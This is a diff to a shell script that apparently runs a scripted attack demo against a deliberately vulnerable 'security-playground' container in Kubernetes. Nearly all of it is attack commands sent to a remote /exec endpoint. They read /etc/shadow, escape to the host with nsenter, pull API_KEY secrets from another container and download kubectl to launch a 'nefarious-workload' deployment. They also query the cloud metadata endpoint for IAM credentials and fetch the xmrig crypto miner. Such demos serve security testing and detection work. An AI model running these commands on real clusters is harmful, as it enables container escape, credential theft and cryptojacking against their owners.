@@ -3,6 +3,10 @@
 
 NODE_IP=$(kubectl get nodes -o wide | awk 'FNR == 2 {print $6}')
 NODE_PORT=30001
+HELLO_NAMESPACE=team1
+
+# Try to reach hello-server for our NetworkPolicy example later
+curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=curl http://hello-server.$HELLO_NAMESPACE.svc:8080" > /dev/null
 
 echo "1. Read a sensitive file (/etc/shadow)"
 echo "--------------------------------------------------------------------------------"
@@ -42,10 +46,10 @@ curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crict
 echo "--------------------------------------------------------------------------------"
 sleep 10
 
-echo "6. Steal a secret from another container on the same Node (hello-client-allowed in the team1 Namespace)"
+echo "6. Steal a secret from another container on the same Node (hello-client-allowed in the $HELLO_NAMESPACE Namespace)"
 echo "--------------------------------------------------------------------------------"
 HELLO_ID=$(curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps --name hello-client-allowed -q')
-HELLO_ID_1=$(echo $HELLO_ID | tail -n 1)
+HELLO_ID_1=`echo "${HELLO_ID}" | head -1`
 curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 crictl exec $HELLO_ID_1 /bin/sh -c set" | grep API_KEY
 echo "--------------------------------------------------------------------------------"
 sleep 10
@@ -57,7 +61,22 @@ curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 crict
 echo "--------------------------------------------------------------------------------"
 sleep 10
 
-echo "8. Download and run a common crypto miner (xmrig)"
+echo "8. Call the Kubernetes API via security-playground's K8s ServiceAccount"
+echo "--------------------------------------------------------------------------------"
+curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=curl -O https://s3.us-west-2.amazonaws.com/amazon-eks/1.27.1/2023-04-19/bin/linux/$ARCH/kubectl"
+curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 ./kubectl'
+curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl create deployment nefarious-workload --image=public.ecr.aws/m9h2b5e7/security-playground:270723'
+curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl get pods'
+echo "--------------------------------------------------------------------------------"
+sleep 10
+
+echo "9. Call the Node's Instance Metadata Endpoint from the security-playground container"
+echo "--------------------------------------------------------------------------------"
+curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=curl curl http://169.254.169.254/latest/meta-data/iam/info'
+echo "--------------------------------------------------------------------------------"
+sleep 10
+
+echo "10. Download and run a common crypto miner (xmrig)"
 echo "--------------------------------------------------------------------------------"
 if [[ "$ARCH" == "amd64" ]]; then
     curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz -O xmrig.tar.gz"    
